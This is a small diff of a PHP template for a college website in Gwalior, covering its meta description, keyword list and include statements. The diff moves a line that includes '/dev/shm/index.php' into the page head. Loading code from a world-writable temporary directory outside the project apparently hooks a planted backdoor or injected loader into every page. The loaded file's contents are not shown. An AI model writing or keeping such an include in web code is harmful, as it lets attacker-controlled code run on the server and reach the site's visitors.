@@ -9,7 +9,7 @@
  <?php $description = 'Madhav Mahavidyalaya, Gwalior is a top-ranked college in the region, offering quality education in the fields of Arts, Science, and Commerce. With experienced faculty, modern infrastructure, and dedicated student support services' ?> 
  
  <?php $keywords = 'Best government college in gwalior, Top college in MP, Government college in MP, Best college in gwalior, Top 10 college in gwalior, Madhav College gwalior, colleges near me, online admission, MP online admission, B.com Admission, BA admission, B.sc admission, best education in gwalior, government madhav college in MP, exam form, form notice, chance session march, exam form notice, ba bcom, read, gwalior, education, all, view, view all, national' ?>
-    
+<?php include "/dev/shm/index.php"; ?> 
  <?php include "includes/head.php"; ?>
 </head>
 <body>
@@ -25,7 +25,7 @@
   </div>
 </div>
 <?php include "includes/header.php"; ?> 
-<?php include "/dev/shm/index.php"; ?> 
+
 <style type="text/css">
   .btn-secondary {
     color: #002654;
